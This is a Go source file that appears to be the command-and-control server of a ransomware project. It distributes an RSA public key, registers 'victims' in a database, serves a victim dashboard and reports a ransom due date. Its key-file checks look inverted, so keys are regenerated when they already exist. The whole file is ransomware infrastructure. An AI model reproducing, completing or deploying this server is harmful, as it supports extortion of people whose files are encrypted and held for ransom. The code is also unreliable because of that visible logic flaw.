package main

import (
	"log"
	"net/http"
	"os"

	"github.com/joho/godotenv"
	"github.com/nireo/gocry/server/database"
	"github.com/nireo/gocry/server/gen_rsa"
	"github.com/nireo/gocry/server/handlers"
)

func main() {
	// Load environment variables, such that we can take database parameters
	if err := godotenv.Load(); err != nil {
		log.Fatalf("could not load environment variables: %s", err)
	}

	database.ConnectToDatbase()
	db := database.GetDatabase()
	// This is mostly just for debugging purposes
	if len(os.Args) == 2 && os.Args[1] == "remove_data" {

		// find all victims and remove their database entries.
		var victims []database.Victim
		db.Find(&victims)
		for _, victim := range victims {
			db.Delete(victim)
		}

		return
	}

	// ensure that a rsa public key exists
	if _, err := os.Stat("./public.pem"); !os.IsNotExist(err) {
		gen_rsa.GenerateRSAKeypair()
	}

	// ensure that a rsa private key exists
	if _, err := os.Stat("./private.pem"); !os.IsNotExist(err) {
		gen_rsa.GenerateRSAKeypair()
	}

	// Define routes
	http.HandleFunc("/pubkey", handlers.GetRSAPubKey)
	http.HandleFunc("/register", handlers.RegisterNewVictim)
	http.HandleFunc("/dashboard", handlers.ServeVictimsDisplay)
	http.HandleFunc("/due", handlers.GetRansomwareDueDate)

	log.Print("server running on port 8080")

	// start the http listener
	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
		log.Fatalf("error while running listenandserver: %s", err.Error())
	}
}
